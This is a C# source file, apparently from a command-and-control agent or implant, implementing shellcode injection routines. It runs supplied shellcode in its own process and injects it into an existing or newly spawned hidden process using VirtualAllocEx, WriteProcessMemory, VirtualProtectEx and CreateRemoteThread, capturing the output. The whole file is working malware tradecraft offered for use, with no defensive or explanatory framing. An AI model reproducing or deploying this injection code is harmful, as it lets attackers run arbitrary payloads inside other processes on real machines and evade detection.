using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Internal
{
    public class InjectionResult
    {
        public bool Succeed { get; set; } = true;
        public string Error { get; set; }
        public string Output { get; set; }
    }

    public static class Injector
    {

        public static InjectionResult InjectSelfWithOutput(byte[] shellcode)
        {
            var ret = new InjectionResult();
            var currentOut = Console.Out;
            var currentError = Console.Out;
            using (var ms = new MemoryStream())
            using (var sw = new StreamWriter(ms))
            {
                Console.SetOut(sw);
                Console.SetError(sw);
                sw.AutoFlush = true;


                ret = InjectSelf(shellcode);

                Console.Out.Flush();
                Console.Error.Flush();

                Console.SetOut(currentOut);
                Console.SetError(currentError);

                var output = Encoding.UTF8.GetString(ms.ToArray());

                ret.Output = output;
            }
            return ret;
        }


        public static InjectionResult SpawnInjectWithOutput(byte[] shellcode, string processName)
        {
            var ret = new InjectionResult();
            var startInfo = new ProcessStartInfo()
            {
                FileName = processName,
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,

            };

            var process = new Process
            {
                StartInfo = startInfo,
            };

            string output = string.Empty;
            process.OutputDataReceived += (s, e) => { output += e.Data + Environment.NewLine; };
            process.ErrorDataReceived += (s, e) => { output += e.Data + Environment.NewLine; };

            process.Start();

            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            var baseAddress = Native.Kernel32.VirtualAllocEx(
                process.Handle,
                IntPtr.Zero,
                shellcode.Length,
                Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
                Native.Kernel32.MemoryProtection.ReadWrite);

            if (baseAddress == IntPtr.Zero)
            {
                ret.Error = $"Failed to allocate memory for Loader.dll, error code: {Marshal.GetLastWin32Error()}";
                ret.Succeed = false;
                return ret;
            }

            try
            {
                IntPtr bytesWritten = IntPtr.Zero;
                if (!Native.Kernel32.WriteProcessMemory(process.Handle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
                {
                    ret.Error = $"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}";
                    ret.Succeed = false;
                    return ret;
                }

                if (bytesWritten.ToInt32() != shellcode.Length)
                {
                    ret.Error = $"Failed to write All the shellcode into the process";
                    ret.Succeed = false;
                    return ret;
                }

                if (!Native.Kernel32.VirtualProtectEx(
                    process.Handle,
                    baseAddress,
                    shellcode.Length,
                    Native.Kernel32.MemoryProtection.ExecuteRead,
                    out _))
                {
                    throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");
                }

                IntPtr threadres = IntPtr.Zero;

                IntPtr thread = Native.Kernel32.CreateRemoteThread(process.Handle, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadres);

                if (thread == IntPtr.Zero)
                {
                    throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
                }

                Native.Kernel32.WaitForSingleObject(thread, 0xFFFFFFFF);
            }
            catch (InvalidOperationException e)
            {
                ret.Error = e.Message;
                ret.Succeed = false;
                return ret;
            }
            finally
            {
                Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
            }

            process.WaitForExit();

            ret.Output = output;
            ret.Succeed = true;
            return ret;
        }

        public static InjectionResult InjectSelf(byte[] shellcode)
        {
            var ret = new InjectionResult();
            var baseAddress = Native.Kernel32.VirtualAlloc(
                    IntPtr.Zero,
                    shellcode.Length,
                    Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
                    Native.Kernel32.MemoryProtection.ExecuteReadWrite);

            if (baseAddress == IntPtr.Zero)
            {
                ret.Error = $"Failed to allocate memory for shellcode, error code: {Marshal.GetLastWin32Error()}";
                ret.Succeed = false;
                return ret;
            }

            try
            {
                Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

                if (!Native.Kernel32.VirtualProtect(
                    baseAddress,
                    shellcode.Length,
                    Native.Kernel32.MemoryProtection.ExecuteRead,
                    out _))
                {
                    throw new InvalidOperationException($"Failed to change memory to execute, error code: {Marshal.GetLastWin32Error()}");
                }

                uint threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                IntPtr hThread = Native.Kernel32.CreateThread(
                    0,
                  0,
                  baseAddress,
                  pinfo,
                  0,
                  ref threadId);

                if (hThread == IntPtr.Zero)
                {
                    throw new InvalidOperationException($"Failed to create  thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
                }

                Native.Kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (InvalidOperationException e)
            {
                ret.Error = e.Message;
                return ret;
            }
            finally
            {
                Native.Kernel32.VirtualFreeEx(Process.GetCurrentProcess().Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
            }
            ret.Succeed = true;
            return ret;
        }

        public static InjectionResult Inject(Process target, byte[] shellcode, bool waitEndToContinue = false)
        {
            var ret = new InjectionResult();
            var baseAddress = Native.Kernel32.VirtualAllocEx(
                target.Handle,
                IntPtr.Zero,
                shellcode.Length,
                Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
                Native.Kernel32.MemoryProtection.ReadWrite);

            if (baseAddress == IntPtr.Zero)
            {
                ret.Error = $"Failed to allocate memory for Loader.dll, error code: {Marshal.GetLastWin32Error()}";
                ret.Succeed = false;
                return ret;
            }

            try
            {
                IntPtr bytesWritten = IntPtr.Zero;
                if (!Native.Kernel32.WriteProcessMemory(target.Handle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
                {
                    ret.Error = $"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}";
                    ret.Succeed = false;
                    return ret;
                }

                if (bytesWritten.ToInt32() != shellcode.Length)
                {
                    ret.Error = $"Failed to write All the shellcode into the process";
                    ret.Succeed = false;
                    return ret;
                }

                if (!Native.Kernel32.VirtualProtectEx(
                    target.Handle,
                    baseAddress,
                    shellcode.Length,
                    Native.Kernel32.MemoryProtection.ExecuteRead,
                    out _))
                {
                    throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");
                }

                IntPtr threadres = IntPtr.Zero;

                IntPtr thread = Native.Kernel32.CreateRemoteThread(target.Handle, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadres);

                if (thread == IntPtr.Zero)
                {
                    throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
                }


                if (waitEndToContinue)
                {
                    Native.Kernel32.WaitForSingleObject(thread, 0xFFFFFFFF);
                }
            }
            catch (InvalidOperationException e)
            {
                ret.Error = e.Message;
                ret.Succeed = false;
                return ret;
            }
            finally
            {
                if (waitEndToContinue)
                {
                    Native.Kernel32.VirtualFreeEx(target.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
                }
            }
            return ret;

        }
    }
}
